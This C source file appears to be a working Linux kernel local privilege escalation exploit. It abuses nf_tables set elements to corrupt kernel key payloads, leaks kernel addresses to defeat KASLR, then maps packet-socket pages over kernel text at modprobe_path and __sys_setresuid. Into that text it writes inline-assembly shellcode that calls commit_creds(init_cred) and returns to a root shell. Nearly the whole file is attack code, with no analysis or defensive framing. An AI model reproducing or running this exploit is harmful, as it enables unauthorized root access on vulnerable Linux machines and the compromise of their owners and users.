#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <linux/limits.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <inttypes.h>
#include <sched.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdarg.h>

#include "netlink.h"

struct verdict_data {
	uint32_t code;
	void *chain;
};


#define INIT_CRED "0xffffffff81000000"
#define COMMIT_CREDS "0xffffffff81000001"
#define KPTI_TRAMPOLINE "0xffffffff81000002"
#define SHELL "0x1234567832165478"
#define CS "0x33"
#define RFLAGS "0x246"
#define STACK "0x1234567887654321"
#define SS "0x2b"
#define ZERO "0"

#define evil "sub rsp, 0x300;\nmov rdi, "INIT_CRED";\nmov rax, "COMMIT_CREDS";\ncall rax;\npush "SS";\nmov rax, "STACK";\npush rax;\npush "RFLAGS";\npush "CS";\nmov rax, "SHELL";\npush rax;\npush "ZERO";\nmov rax, "KPTI_TRAMPOLINE";\ncall rax;"
#define NOP "nop;"

void rootkit();
void GUARD();
asm("rootkit:"
    evil);
asm("GUARD:"
    NOP);


size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

int main() {
	int pipe_fd[2];
	if (pipe(pipe_fd) < 0) fail_exit("pipe()");
	pid_t pid = fork();

	if (!pid) {
		puts("[+] Let's get it!!!");
		unshare_setup();
		save_status();
		system("ip link set dev lo up");
		system("ip addr");
		puts("");
		puts("=================== Bypass KASLR ==============");
		uint64_t koffset = -1;
		uint64_t kbase = 0xffffffff81000000;
		#define KEY_NUMS 0x30
		char desc[0x20] = { 0 };
		int key_ids[KEY_NUMS] = { 0 };
		char elem_key[30] = { 0 };
		char payload[0x100] = { 0 };
		char overwrite_data[0x100] = { 0 };
		char buf[0x10000] = { 0 };
		int res, evil_key = -1;
		struct verdict_data* verdict = payload;

		char *table_name = "evil_table";
		char *set_name 	 = "evil_set";

		create_table(table_name);
		create_set(table_name, set_name, 28, 16+0x28, 1);

		for (int i = 0; i < KEY_NUMS; i++) {
			sprintf(desc, "%s%d", "X", i);
			key_ids[i] = key_alloc(desc, payload, 28);
		}
	
		elem_key[0] = 1;
		memset(payload, 0, sizeof(payload));
		memset(overwrite_data, '\xff', sizeof(overwrite_data));
		verdict->code = NFT_CONTINUE;
		set_elem(table_name, set_name, elem_key, verdict, 16+0x28, overwrite_data);
	
	
		for (int i = 0; i < KEY_NUMS; i++) {
			res = key_read(key_ids[i], buf, 0xffff);
			if (res > 28) {
				evil_key = i;
				break;
			} 
		}
		if (evil_key == -1)
			err_exit("Failed to overwrite user_key_payload.datalen");
	
		printf("[+] evil key: %d\n", evil_key);

		for (int i = 0; i < KEY_NUMS; i++) {
			if (i != evil_key)
				key_revoke(key_ids[i]);
		}

		res = key_read(key_ids[evil_key], buf, 0xffff);
		printf("[+] key_read datalen: %#x\n", res);
	//	binary_dump("LEAK DATA", buf, 0x200);
		uint64_t *ptr = (uint64_t*)buf;
		uint64_t target = 0xffffffff81572e10;
		for (int i = 0; i < res / 8; i++) {
			if ((ptr[i]&0xfff) == 0xe10 && ptr[i] > kbase) {
				koffset = ptr[i] - target;
				kbase += koffset;
				break;
			}
		}

		printf("[+] koffset: %#llx\n", koffset);
		printf("[+] kbase: %#llx\n\n", kbase);
	
		puts("===================== LPE =====================");
		#define PGV_NUMS 0x30
		uint64_t commit_creds = 0xffffffff810fc260 + koffset;
		uint64_t init_cred  = 0xffffffff82a8b140 + koffset;
		uint64_t kpti_trampoline = 0xffffffff82000ff0+27 + koffset;
		uint64_t __sys_setresuid = 0xffffffff810e6ed0 + koffset;
		uint64_t modprobe_path = 0xffffffff82a8c240 + koffset;
		printf("[+] modprobe_path: %#llx\n", modprobe_path);
		printf("[+] __sys_setresuid: %#llx\n", __sys_setresuid);
		int pgv_ids[PGV_NUMS] = { 0 };
		for (int i = 0; i < PGV_NUMS; i++) {
			pgv_ids[i] = pagealloc_pad(5, 0x1000);
		}
		
		for (int i = 0; i < PGV_NUMS; i += 3) {
			close(pgv_ids[i]);
		}

		elem_key[0] += 1;
		memset(payload, 0, sizeof(payload));
		*(uint64_t*)(overwrite_data + 0 * 8) = modprobe_path & (~0xfff);
		*(uint64_t*)(overwrite_data + 1 * 8) = modprobe_path & (~0xfff);
		*(uint64_t*)(overwrite_data + 2 * 8) = modprobe_path & (~0xfff);
		for (int i = 3; i < sizeof(overwrite_data) / 8; i++)
			*(uint64_t*)(overwrite_data + i * 8) = __sys_setresuid & (~0xfff);
		
		verdict->code = NFT_CONTINUE;
		set_elem(table_name, set_name, elem_key, verdict, 16+0x28, overwrite_data);

		char *page = NULL, *str = NULL;
		for (int i = 0; i < PGV_NUMS; i++) {
			if (i % 3 != 0) {
				page = mmap(NULL, 0x1000*5, PROT_READ|PROT_WRITE, MAP_SHARED, pgv_ids[i], 0);
				if (page == -1) continue;
				
				str = page + (modprobe_path & 0xfff);
				if (!strcmp(str, "/sbin/modprobe")) {
					puts("[+] USMA attack successfully");
					break;
					
				}
				munmap(page, 0x1000*5);
				str = NULL;
			}
		}
		if (str == NULL) err_exit("Failed USMA");
		str = page + 0x1000 + (__sys_setresuid & 0xfff) + 5;
		char shellcode[0x200] = { 0 };
		uint64_t length = GUARD - rootkit;
		memcpy(shellcode, rootkit, length);
		*(uint32_t*)(shellcode+3+7) = init_cred;
		*(uint32_t*)(shellcode+10+7) = commit_creds;
		*(uint64_t*)(shellcode+20+7) = user_sp & (~0xff);
		*(uint64_t*)(shellcode+38+7) = get_root_shell;
		*(uint32_t*)(shellcode+59) = kpti_trampoline;
		
		printf("[+] shellcode length: %#x <==> %d\n", length, length);
		binary_dump("shellcode", shellcode, length);
		memcpy(str, shellcode, length);
		write(pipe_fd[1], "A", 1);
		exit(0);
	} else if (pid < 0) {
		fail_exit("fork()");
	} else {
		char buf[1];
		read(pipe_fd[0], buf, 1);	
		puts("[+] Try to LPE");
		setresuid(0, 0, 0);
		puts("[+] EXP NERVER END");
		exit(0);
	}
	
	return 0;
}
